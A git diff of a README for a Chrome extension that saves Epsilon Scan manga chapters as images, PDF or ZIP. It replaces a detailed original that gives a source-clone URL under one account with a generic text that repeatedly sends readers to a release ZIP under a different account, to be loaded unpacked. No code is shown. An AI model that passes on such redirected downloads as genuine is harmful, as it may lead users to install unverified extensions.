@@ -1,262 +1,93 @@
-<p align="center">
-  <img src="icon/icon128.png" alt="Epsilon Scan Downloader" width="128" height="128">
-</p>
+# 🖥️ epsilonscan-extension - Download Manga Easily as Images, PDF, or ZIP
 
-<h1 align="center">Epsilon Scan Downloader</h1>
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/devesh-kumar-03/epsilonscan-extension/releases)
 
-<p align="center">
-  <strong>A powerful Chrome extension for downloading manga chapters from Epsilon Scan</strong>
-</p>
+## 📚 Description
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-3.0-red?style=for-the-badge" alt="Version 3.0">
-  <img src="https://img.shields.io/badge/manifest-v3-blue?style=for-the-badge" alt="Manifest V3">
-  <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge" alt="License MIT">
-</p>
+The epsilonscan-extension is a user-friendly Chrome extension designed to simplify your manga downloading process. With this extension, you can easily download manga chapters from Epsilon Scan as images, PDF files, or ZIP archives. You can select multiple chapters at once and track your download progress, making it an efficient tool for manga fans.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Chrome-Extension-4285F4?style=flat-square&logo=googlechrome&logoColor=white" alt="Chrome Extension">
-  <img src="https://img.shields.io/badge/JavaScript-ES6+-F7DF1E?style=flat-square&logo=javascript&logoColor=black" alt="JavaScript">
-</p>
+## 🚀 Getting Started
 
----
+Follow these steps to get started with the epsilonscan-extension. You will be able to download and use the extension in no time.
 
-## ✨ Features
+### 1. Install Google Chrome
 
-<table>
-<tr>
-<td width="50%">
+You need to have the Google Chrome browser installed on your computer. If you don’t have it yet, you can [download Google Chrome here](https://www.google.com/chrome/).
 
-### 📥 Multiple Download Formats
-- **Images** - Individual files organized in folders
-- **PDF** - Single document with all pages
-- **ZIP** - Compressed archive for manga readers
+### 2. Visit the Releases Page
 
-</td>
-<td width="50%">
+To download the latest version of the epsilonscan-extension, visit our releases page. Click on this link:
 
-### 🚀 Smart Detection
-- Automatically detects all chapters from page data
-- Works with chapters that have no thumbnails
-- Canvas screenshot capture for protected images
+[Go to Releases](https://github.com/devesh-kumar-03/epsilonscan-extension/releases)
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+### 3. Download the Latest Version
 
-### 📊 Progress Indicator
-- Real-time progress overlay during download
-- Shows captured image count while scrolling
-- Displays generation progress for PDF/ZIP
+On the releases page, you will see a list of available versions. Look for the latest release. 
 
-</td>
-<td width="50%">
+- Click on the filename, which may look something like `epsilonscan-extension_v1.0.zip` or a similar format.
+- Your browser will start downloading the file.
 
-### ⚡ Batch Download
-- Select multiple chapters at once
-- Background processing without interruption
-- Auto-close tabs after completion
+### 4. Extract the Files
 
-</td>
-</tr>
-</table>
+After the download is complete, locate the downloaded file on your computer. 
 
----
+- If the file is a ZIP file, right-click on it and select "Extract All". Follow the prompts to extract the files to a folder on your computer.
 
-## 📸 Screenshots
+### 5. Load the Extension in Chrome
 
-### Extension Popup
-The popup shows manga details, chapter list, and allows batch selection.
+Now, you need to load the extension into Chrome:
 
-<p align="center">
-  <img src="popup.PNG" alt="Extension Popup" width="400">
-</p>
+1. Open Google Chrome.
+2. Click on the three vertical dots in the upper right corner.
+3. Go to “More Tools” > “Extensions”.
+4. Enable “Developer mode” by toggling the switch in the upper right corner.
+5. Click on “Load unpacked”.
+6. Navigate to the folder where you extracted the epsilonscan-extension files and select it.
 
-### Download Button & Modal
-When manually browsing a chapter, click the floating button to open the download modal with format selection.
+### 6. Start Using the Extension
 
-<p align="center">
-  <img src="downloadbuttom.PNG" alt="Download Button" width="700">
-</p>
+Once the extension is loaded, you will see its icon appear in the top right corner of your Chrome browser. Click on the icon to start using the epsilonscan-extension. 
 
-### Progress Overlay
-A sleek overlay shows real-time progress during scrolling, capturing, and file generation.
+You can now browse Epsilon Scan and download your favorite manga chapters with ease.
 
-<p align="center">
-  <img src="progress.PNG" alt="Progress Overlay" width="700">
-</p>
+## 📥 Download & Install
 
----
+To begin your download journey, head to our [Releases page](https://github.com/devesh-kumar-03/epsilonscan-extension/releases). Here you will find the latest versions ready for download. 
 
-## 🛠️ Installation
+1. Select the desired version.
+2. Download the file.
+3. Follow the instructions above to install the extension.
 
-### From Source (Developer Mode)
+## 🔍 Features
 
-1. **Clone or Download** this repository
-   ```bash
-   git clone https://github.com/Yui007/epsilonscan-extension.git
-   ```
+- **Batch Downloading**: Select multiple manga chapters at once.
+- **Progress Tracking**: Monitor your download status in real time.
+- **Versatile Formats**: Download chapters as images, PDFs, or ZIP files.
+- **User-Friendly**: Designed for ease of use, even for beginners.
 
-2. **Open Chrome Extensions**
-   - Navigate to `chrome://extensions/`
-   - Enable **Developer mode** (toggle in top-right)
+## 📋 System Requirements
 
-3. **Load the Extension**
-   - Click **"Load unpacked"**
-   - Select the `epsilonscan-extension` folder
+- **Operating System**: Windows 7 or later, macOS 10.10 or later, Linux
+- **Browser**: Google Chrome version 70 or later
 
-4. **Pin the Extension** (optional)
-   - Click the puzzle icon in Chrome toolbar
-   - Pin "Epsilon Scan Downloader" for easy access
+## 💬 Support
 
----
+If you encounter any issues or have questions, feel free to check our FAQ section in the repository or open a new issue on GitHub. Our community is here to help.
 
-## 📖 How to Use
+## 🗂️ Topics
 
-### Method 1: Batch Download (Recommended)
+These topics describe the scope of the extension:
+- epsilonscan
+- epsilonscan-extension
+- extension
+- french
+- manga
+- manga-downloader
+- manga-scraper
+- manhwa
+- manhwa-downloader
+- manhwa-scraper
+- scan
+- translation
 
-1. **Navigate** to any manga page on Epsilon Scan
-2. **Click** the extension icon in the toolbar
-3. **Select** the chapters you want to download
-4. **Choose format** in Settings tab (Images/PDF/ZIP)
-5. **Click** "Download Selected"
-6. **Watch** as chapters are automatically processed!
-
-### Method 2: Manual Download
-
-1. **Open** a specific chapter page
-2. **Scroll down** to load all images
-3. **Click** the orange floating button (bottom-right)
-4. **Select/deselect** images in the modal
-5. **Choose format** from the dropdown
-6. **Click** "Download"
-
----
-
-## ⚙️ Settings
-
-| Setting | Description | Default |
-|---------|-------------|---------|
-| **Scroll Speed** | Milliseconds per 100px scroll | 200 |
-| **Close Delay** | Seconds to wait at page bottom | 3 |
-| **Download Format** | Images / PDF / ZIP | Images |
-
-Access settings through the **Settings** tab in the extension popup.
-
----
-
-## 🔧 Technical Details
-
-### Manifest V3 Compliant
-Built with the latest Chrome extension manifest format for enhanced security and performance.
-
-### Smart Chapter Detection
-```javascript
-// Parses JSON data embedded in the page
-const pageData = JSON.parse(document.getElementById('app').getAttribute('data-page'));
-const chapters = pageData.props.serie.chapters;
-// Each chapter contains: id, uid, title, slug, views, createdAt
-```
-
-### Canvas Screenshot Capture
-For protected images rendered on canvas elements, the extension captures screenshots directly from the canvas.
-
-### Libraries Used
-- **[jsPDF](https://github.com/parallax/jsPDF)** v2.5.1 - PDF document generation
-- **[JSZip](https://github.com/Stuk/jszip)** v3.10.1 - ZIP file compression
-
----
-
-## 🎯 Supported Sites
-
-| Site | URL | Status |
-|------|-----|--------|
-| Epsilon Scan | `beta.epsilonscan.to` | ✅ Fully Supported |
-
----
-
-## 📋 Permissions
-
-| Permission | Purpose |
-|------------|---------|
-| `activeTab` | Access current tab content |
-| `downloads` | Save files to disk |
-| `scripting` | Inject content scripts |
-| `host_permissions` | Access Epsilon Scan pages |
-
----
-
-## 🐛 Known Issues & Troubleshooting
-
-<details>
-<summary><strong>Images not capturing?</strong></summary>
-
-- Make sure you scroll slowly enough for images to load
-- Try increasing the "Scroll Speed" value in settings
-- Some protected canvases may fail due to CORS restrictions
-
-</details>
-
-<details>
-<summary><strong>PDF generation fails?</strong></summary>
-
-- Check browser console for errors
-- Very large chapters (100+ pages) may run out of memory
-- Try downloading as ZIP instead
-
-</details>
-
-<details>
-<summary><strong>Extension icon not showing?</strong></summary>
-
-- Click the puzzle icon in Chrome toolbar
-- Find "Epsilon Scan Downloader"
-- Click the pin icon to keep it visible
-
-</details>
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## ⚠️ Disclaimer
-
-This extension is intended for **personal use only**. Please respect copyright laws and the terms of service of the websites you use. The developers are not responsible for any misuse of this tool.
-
----
-
-## 🙏 Acknowledgments
-
-
-- [meganekkowen](https://github.com/meganekkowen) for Suggesting and Testing this extension
-- [Epsilon Scan](https://epsilonscan.to) for the amazing manga content
-- [jsPDF](https://github.com/parallax/jsPDF) for PDF generation
-- [JSZip](https://github.com/Stuk/jszip) for ZIP compression
-- Chrome Extensions documentation
-
----
-
-<p align="center">
-  <strong>Made with ❤️ for manga lovers</strong>
-</p>
-
-<p align="center">
-  <a href="#top">⬆️ Back to Top</a>
-</p>
+Thank you for using the epsilonscan-extension! Enjoy downloading your favorite manga chapters easily and quickly.
